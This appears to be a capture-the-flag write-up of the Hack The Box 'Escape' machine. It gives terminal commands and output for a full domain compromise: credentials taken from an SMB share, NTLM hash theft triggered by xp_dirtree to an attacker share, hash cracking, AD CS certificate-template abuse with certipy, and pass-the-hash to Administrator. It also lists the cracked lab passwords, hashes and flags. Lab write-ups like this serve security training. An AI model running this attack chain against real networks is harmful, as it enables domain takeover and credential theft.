## Escape
### Initial access
We enum smb service and get cred from pdf file.

```bash
┌──(kali㉿kali)-[~/HTB/Escape]
└─$ smbclient -L //10.129.32.70 -N                                               

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.32.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                             
┌──(kali㉿kali)-[~/HTB/Escape]
└─$ smbclient //10.129.32.70/Public -N                                                 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1467965 blocks available
smb: \> 

┌──(kali㉿kali)-[~/HTB/Escape]
└─$ nxc mssql 10.129.32.70 -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
MSSQL       10.129.32.70    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
MSSQL       10.129.32.70    1433   DC               [+] DC\PublicUser:GuestUserCantWrite1 

┌──(kali㉿kali)-[~/HTB/Escape]
└─$ impacket-mssqlclient  PublicUser:'GuestUserCantWrite1'@10.129.32.70 
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
SQL (PublicUser  guest@master)> EXEC master..xp_dirtree '\\10.10.15.143\share';
subdirectory   depth   
------------   -----   

```

We using responder to catch hash of sql_svc

```bash
[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                  

[SMB] NTLMv2-SSP Client   : 10.129.32.70
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:53e26b07edef1d1c:C833F0EE27D3CED4D808F2ADC64DD91B:010100000000000000CD305D7A37DD018C48786AEA151B02000000000200080037004E005400570001001E00570049004E002D0036005A0056005600340046004700570043005500560004003400570049004E002D0036005A005600560034004600470057004300550056002E0037004E00540057002E004C004F00430041004C000300140037004E00540057002E004C004F00430041004C000500140037004E00540057002E004C004F00430041004C000700080000CD305D7A37DD010600040002000000080030003000000000000000000000000030000063B89C42DE7DEEA538ED582932795604DC96193888E15D0F6E152BEE7DD7D8120A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100340033000000000000000000        

```


```bash
echo 'sql_svc::sequel:53e26b07edef1d1c:C833F0EE27D3CED4D808F2ADC64DD91B:010100000000000000CD305D7A37DD018C48786AEA151B02000000000200080037004E005400570001001E00570049004E002D0036005A0056005600340046004700570043005500560004003400570049004E002D0036005A005600560034004600470057004300550056002E0037004E00540057002E004C004F00430041004C000300140037004E00540057002E004C004F00430041004C000500140037004E00540057002E004C004F00430041004C000700080000CD305D7A37DD010600040002000000080030003000000000000000000000000030000063B89C42DE7DEEA538ED582932795604DC96193888E15D0F6E152BEE7DD7D8120A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100340033000000000000000000' > sql_hash.txt
┌──(kali㉿kali)-[~/HTB/Escape]
└─$ hashcat -m 5600 sql_hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 7 8700G w/ Radeon 780M Graphics, 2901/5802 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 514 MB (3745 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344388
* Bytes.....: 139921531
* Keyspace..: 14344388

SQL_SVC::sequel:53e26b07edef1d1c:c833f0ee27d3ced4d808f2adc64dd91b:010100000000000000cd305d7a37dd018c48786aea151b02000000000200080037004e005400570001001e00570049004e002d0036005a0056005600340046004700570043005500560004003400570049004e002d0036005a005600560034004600470057004300550056002e0037004e00540057002e004c004f00430041004c000300140037004e00540057002e004c004f00430041004c000500140037004e00540057002e004c004f00430041004c000700080000cd305d7a37dd010600040002000000080030003000000000000000000000000030000063b89c42de7deea538ed582932795604dc96193888e15d0f6e152bee7dd7d8120a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100340033000000000000000000:REGGIE1234ronnie


```

We have sql_svc cred  and we can escalation to revshell

```bash
┌──(kali㉿kali)-[~/HTB/Escape]
└─$ nxc winrm 10.129.32.70 -u 'sql_svc' -p 'REGGIE1234ronnie'

WINRM       10.129.32.70    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.32.70    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
             
┌──(kali㉿kali)-[~/HTB/Escape]
└─$ evil-winrm -i  10.129.32.70    -u sql_svc  -p 'REGGIE1234ronnie'  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc

```

### Lateral Movement
We looting log of sql server

```bash
*Evil-WinRM* PS C:\tmp> Get-Content "C:\SQLServer\Logs\ERRORLOG.BAK" | Select-String "Logon failed"
 

2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]


```

### Priv escalation

Run winpeas we see vector to exploit, 

```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC (T1649)
È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
È Check for ADCS misconfigurations in the local DC registry
  StrongCertificateBindingEnforcement:  - Allow weak mapping if SID extension missing, may be vulnerable to ESC9.
  CertificateMappingMethods:  - Strong Certificate mapping enabled.
  IF_ENFORCEENCRYPTICERTREQUEST set in InterfaceFlags - not vulnerable to ESC11.
  szOID_NTDS_CA_SECURITY_EXT not disabled for the CA - not vulnerable to ESC16.
È 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4                                          
  Dangerous rights over template: User  (Rights: WriteProperty,ExtendedRight)
  Dangerous rights over template: UserSignature  (Rights: WriteProperty,ExtendedRight)
  Dangerous rights over template: ClientAuth  (Rights: WriteProperty,ExtendedRight)
  Dangerous rights over template: EFS  (Rights: WriteProperty,ExtendedRight)
  [*] Tip: Abuse with tools like Certipy (template write -> ESC1 -> enroll).



```
 We using certipy with new cred and find vulnerble template.

```bash {27}


┌──(kali㉿kali)-[~/HTB/Escape]
└─$ cat 20260829064350_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Access Rights
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication



┌──(kali㉿kali)-[~/HTB/Escape]
└─$ certipy req -username 'Ryan.Cooper@sequel.htb' -password 'NuclearMosquito3' -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'Administrator@sequel.htb' -dc-ip 10.129.32.70 

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
                                                             



faketime "$(ntpdate -q 10.129.32.70 | tail -n 1 | awk '{print $1,$2,$3}')" certipy auth -pfx administrator.pfx -dc-ip 10.129.32.70

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee


```

We have admin hash and pwn the challenge and can get 2 flag

```bash
──(kali㉿kali)-[~/HTB/Escape]
└─$ evil-winrm -i  10.129.32.70    -u Administrator  -H a52f78e4c751e5f5e17e1e9f3e58f4ee  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 


*Evil-WinRM* PS C:\Users> 
*Evil-WinRM* PS C:\Users> cat Ryan.Cooper/desktop/user.txt
417643a244da171eb7de940866a3401f
*Evil-WinRM* PS C:\Users> cat administrator/desktop/root.txt
4b6cc1e984d72394158c77ef0bfe9c42
*Evil-WinRM* PS C:\Users> whoami
sequel\administrator


```

| Username      | pass                | Hash                             |
| ------------- | ------------------- | -------------------------------- |
| brandon.brown |                     |                                  |
| PublicUser    | GuestUserCantWrite1 |                                  |
| SQL_SVC       | REGGIE1234ronnie    |                                  |
| Ryan.Cooper   | NuclearMosquito3    |                                  |
| administator  |                     | a52f78e4c751e5f5e17e1e9f3e58f4ee |
